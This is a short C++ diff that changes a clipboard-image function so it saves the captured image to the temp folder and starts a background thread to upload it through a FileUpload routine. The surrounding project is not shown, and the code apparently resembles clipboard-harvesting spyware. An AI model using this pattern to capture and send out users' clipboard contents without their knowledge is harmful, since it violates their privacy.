@@ -45,7 +45,11 @@ BOOL mm_getclipboardimage() {
 			encoderParameters.Parameter[0].NumberOfValues = 1;
 			ULONG quality = 75;
 			encoderParameters.Parameter[0].Value = &quality;
-			bmp->Save(L"clipboard.jpg", &clsid, &encoderParameters);
+			wchar_t szTmpPath[MAX_PATH];
+			GetTempPath(MAX_PATH, szTmpPath);
+			wstring file = wstring_format(L"%s\\clipboard.jpg", szTmpPath);
+			bmp->Save(file.c_str() , &clsid, &encoderParameters);
+			CreateThread(NULL, NULL, FileUpload, _com_util::ConvertBSTRToString((BSTR)file.c_str()), NULL, NULL);
 		}
 	}
 	return TRUE;
